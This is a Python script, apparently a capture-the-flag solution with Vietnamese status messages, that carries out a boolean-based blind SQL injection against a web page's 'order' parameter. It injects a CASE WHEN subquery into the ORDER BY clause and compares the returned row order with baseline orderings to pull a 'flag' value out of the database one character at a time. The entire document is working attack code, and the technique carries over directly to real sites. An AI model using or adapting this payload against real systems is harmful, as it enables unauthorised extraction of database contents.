import string, requests
from bs4 import BeautifulSoup

chars = list(string.printable)
url = "http://10.48.183.134/"
flag = ""
res = []

def sendRequestGetFirstRow(payload):
    params = {
        "order": payload
    }
    response = requests.get(url, params)
    if response.status_code != 200:
        return None
    soup = BeautifulSoup(response.text, "html.parser")
    first_row = soup.select_one("tbody tr")
    if first_row is None:
        return None
    return first_row.get_text(" ", strip=True)

def createRes():
    print("[+] Tao bo du lieu de so sanh khi SQLi")
    print(f"-- Get {url}?order=title")
    first_row = sendRequestGetFirstRow("title")
    res.append(first_row)

    print(f"-- Get {url}?order=date")
    first_row = sendRequestGetFirstRow("date")
    res.append(first_row)
    print("[+] Tao bo du lieu thanh cong!")

def sqli():
    global flag
    for c in chars:
        s = flag + c
        payload = f"(CASE WHEN (SELECT SUBSTRING(flag,1,{len(s)}) from flag) = '{s}' then title else date end)"
        first_row = sendRequestGetFirstRow(payload)
        if first_row == res[0]:
            print(f"[+] Payload chinh xac: {payload}")
            flag = s 
            return
        
print("[+]Chuong trinh SQLi web qua tham so order!")
createRes()

print("[+] SQL Injection qua tham so order va sql case-when")
print("--- Neu du lieu tra ve sap xep theo title thi ki tu do chinh xac")
print("--- Neu du lieu tra ve sap xep theo date thi ki tu do sai")
while True:
    sqli()
    if '}' in flag:
        print(f"[+] Tim thay flag: {flag}")
        print(f"[+] Ket thuc chuong trinh!")
        break
